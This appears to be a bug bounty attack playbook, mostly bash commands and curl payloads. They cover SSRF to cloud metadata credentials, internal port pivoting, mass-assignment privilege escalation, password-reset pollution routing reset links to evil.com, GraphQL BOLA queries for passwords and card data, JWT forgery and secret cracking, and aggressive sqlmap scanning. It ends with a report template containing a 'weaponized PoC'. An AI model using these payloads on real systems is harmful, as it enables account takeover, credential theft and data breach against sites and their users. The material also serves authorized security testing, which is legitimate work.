# Attack Plan — Full Template & Daily Workflow

---

## Target Setup

```bash
export TARGET="target.com"
mkdir -p ~/bugbounties/$TARGET/{recon,exploits,notes,logs}
cd ~/bugbounties/$TARGET
```

---

## Full Attack Plan Template

```markdown
# Attack Plan — $TARGET

## Intelligence Gathering
- [ ] Subdomains: `subfinder -d $TARGET -all -o recon/subdomains.txt`
- [ ] Subdomain bruteforce: `amass enum -brute -d $TARGET -o recon/amass.txt`
- [ ] Live hosts: `cat recon/subdomains.txt | httpx -title -tech-detect -status-code -o recon/live.txt`
- [ ] Tech stack: Wappalyzer, headers, `X-Powered-By`, Shodan
- [ ] Cloud provider: AWS/GCP/Azure? → check metadata endpoints
- [ ] GitHub recon: `org:"$TARGET" password OR secret OR api_key OR token`
- [ ] Wayback: `gau $TARGET | sort -u > recon/historical_urls.txt`

## Hypothesis Queue (Critical/High only — work in priority order)
- [ ] RCE via file upload (bypass MIME, extension, magic bytes)
- [ ] SSRF → cloud metadata → IAM credentials
- [ ] Mass assignment in registration / profile update
- [ ] IDOR on high-value objects (invoices, exports, admin actions)
- [ ] JWT algorithm confusion (alg:none, RS256→HS256, weak secret)
- [ ] Parameter pollution in password reset → ATO
- [ ] GraphQL introspection + BOLA via query variables
- [ ] Auth bypass (session fixation, predictable tokens, OAuth state)
- [ ] Business logic (race conditions, negative quantities, coupon stacking)
- [ ] SQLi (all params, time-based → OOB)

## Active Procedures
→ See procedures below
```

---

## SSRF Procedure

```bash
# 1. Find SSRF-prone parameters
grep -E "(url=|callback=|webhook=|redirect=|file=|path=|destination=|src=|fetch=|load=|import=)" \
  recon/all_endpoints.txt > recon/ssrf_candidates.txt

# 2. Test AWS metadata
for url in $(cat recon/ssrf_candidates.txt); do
  curl -s "$url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
    -H "Authorization: Bearer $TOKEN" | grep -i "AccessKeyId\|SecretAccessKey" && echo "SSRF FOUND: $url"
done

# 3. GCP metadata
curl "TARGET_SSRF_PARAM=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# 4. OOB detection (use interactsh)
interactsh-client -server oast.pro &
OAST_URL=$(interactsh-client --poll | head -1)
curl "TARGET_SSRF_PARAM=http://$OAST_URL/"

# 5. Internal pivot (if SSRF confirmed)
# Redis via gopher
curl "TARGET_SSRF_PARAM=gopher://127.0.0.1:6379/_INFO"
# Internal HTTP services
for port in 80 443 8080 8443 8888 9200 9300 5601 3306 5432 6379 27017; do
  curl -s "TARGET_SSRF_PARAM=http://127.0.0.1:$port/" | head -c 100
done
```

---

## Mass Assignment Procedure

```bash
# 1. Capture the target endpoint (profile update, registration, etc.)
# 2. Add ALL known privileged fields to the body:
curl -X PUT https://target.com/api/v1/user/profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test",
    "role": "admin",
    "isAdmin": true,
    "is_admin": true,
    "admin": 1,
    "verified": true,
    "active": true,
    "subscription": "enterprise",
    "credits": 999999,
    "balance": 999999,
    "canBypassPayment": true,
    "skipVerification": true,
    "permissions": ["admin", "superuser"],
    "group": "administrators"
  }'

# 3. Check the response — did any fields get reflected?
# 4. GET /api/v1/user/me — did the role/permissions change?
# 5. Try accessing admin functions with the same token
```

---

## Parameter Pollution (Password Reset ATO)

```bash
# Method 1: JSON body pollution
curl -X POST https://target.com/api/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com","email": "attacker@evil.com"}'

# Method 2: Query string pollution
curl -X POST "https://target.com/forgot-password?email=victim@target.com&email=attacker@evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}'

# Method 3: URL-encoded pollution in JSON value
curl -X POST https://target.com/api/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com%26email=attacker@evil.com"}'

# Method 4: Reset token field injection
curl -X POST https://target.com/api/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com%26reset_token=KNOWN_VALUE%23"}'

# Method 5: Host header injection on reset link
curl -X POST https://target.com/api/forgot-password \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}'
# → Reset link goes to evil.com/reset?token=XXX
```

---

## GraphQL Attack Procedure

```bash
# 1. Enable introspection (dumps full schema)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# 2. Find sensitive fields
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}'

# 3. Request privileged fields
curl -X POST https://target.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { id email password apiKey creditCard { number cvv } ssn } }"}'

# 4. BOLA via variables
curl -X POST https://target.com/graphql \
  -H "Authorization: Bearer $VICTIM_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "query($id:ID!){ order(id:$id){ total items { name } payment { card } } }","variables": {"id": "ANOTHER_USER_ORDER_ID"}}'

# 5. Batch query (rate limit bypass)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: 1) { email } }"},
    {"query": "{ user(id: 2) { email } }"},
    {"query": "{ user(id: 3) { email } }"}
  ]'
```

---

## JWT Attack Procedure

```bash
# 1. Decode the token
python3 jwt_tool.py $TOKEN

# 2. Try all attacks
python3 jwt_tool.py $TOKEN -M at

# 3. alg:none
python3 jwt_tool.py $TOKEN -X a

# 4. Crack HS256 secret
python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# 5. RS256 → HS256 confusion
# Extract public key first:
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem
python3 jwt_tool.py $TOKEN -X k -pk pubkey.pem

# 6. kid header path traversal
# Forge token with: "kid": "../../dev/null" + sign with empty string
python3 jwt_tool.py $TOKEN -T  # tamper mode → change kid value

# 7. Use forged token
curl https://target.com/api/admin \
  -H "Authorization: Bearer FORGED_TOKEN"
```

---

## Daily Workflow

```bash
#!/bin/bash
# MuteMaster Daily Workflow
TARGET=$1

# 1. Subdomain recon
subfinder -d $TARGET -all | httpx -title -tech-detect -o live.txt

# 2. Deep crawl everything
katana -list live.txt -d 5 -jc -kf -fx -o all_endpoints.txt

# 3. Historical URLs
gau $TARGET | unfurl paths | sort -u >> all_endpoints.txt

# 4. Parameter fuzzing on all live endpoints
ffuf -u "https://$TARGET/api/v2/FUZZ" -w ~/payloads/endpoints.txt -mc 200,403,500 -o ffuf_results.json

# 5. BOLA hunting (replace IDs with null UUID)
while read url; do
  echo $url | qsreplace "00000000-0000-0000-0000-000000000000" | httpx -status-code
done < endpoints_with_id.txt

# 6. Debug namespace check
grep -E "(debug|actuator|metrics|health|env|heapdump|swagger|api-docs|console)" \
  all_endpoints.txt | httpx -status-code -o debug_endpoints.txt

# 7. Nuclei scan
nuclei -list live.txt -t ~/nuclei-templates/ -severity critical,high -o nuclei_results.txt

# 8. SQLi on all params
sqlmap -m all_endpoints.txt --level=5 --risk=3 --batch --random-agent --threads=5

# 9. JS analysis for secrets
cat all_endpoints.txt | grep "\.js$" | xargs -I{} curl -s {} | \
  grep -E "(api_key|apiKey|secret|password|token|auth|bearer)" | sort -u
```

---

## Bug Report Template

```markdown
# [VULN CLASS] in [ENDPOINT] — [ONE LINE IMPACT]

**Severity:** Critical
**CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**CWE:** CWE-XXX
**Target:** https://target.com/api/endpoint
**Platform:** HackerOne / Intigriti

---

## Summary

[2 sentences maximum. What the bug is + what an attacker achieves.]

---

## Vulnerability Details

[Root cause explanation. Why is this vulnerable? What's missing?]

---

## Steps to Reproduce

1. Log in as a normal user account
2. Send the following request:

```http
POST /api/v1/user/profile HTTP/1.1
Host: target.com
Authorization: Bearer [ATTACKER_TOKEN]
Content-Type: application/json

{"name":"test","role":"admin","isAdmin":true}
```

3. Observe the response:
```json
{"id": 1337, "name": "test", "role": "admin", "isAdmin": true}
```

4. Now access an admin endpoint:
```bash
curl https://target.com/api/admin/users \
  -H "Authorization: Bearer [ATTACKER_TOKEN]"
```

---

## PoC

```bash
# Full weaponized PoC
#!/bin/bash
TARGET="https://target.com"
TOKEN="YOUR_JWT_TOKEN_HERE"

echo "[*] Escalating to admin via mass assignment..."
RESPONSE=$(curl -s -X PUT "$TARGET/api/v1/user/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"pwned","role":"admin","isAdmin":true}')

echo "[*] Response: $RESPONSE"
echo "[*] Testing admin access..."
curl -s "$TARGET/api/admin/users" \
  -H "Authorization: Bearer $TOKEN"
```

---

## Impact

[Be specific. Who can do what to whom.]

An unauthenticated / low-privilege attacker can [specific action] affecting [scope — all users / specific accounts / the entire platform].

**Business Impact:** [Financial loss / data breach / account takeover / service disruption]

---

## Remediation

[One actionable fix.]
```
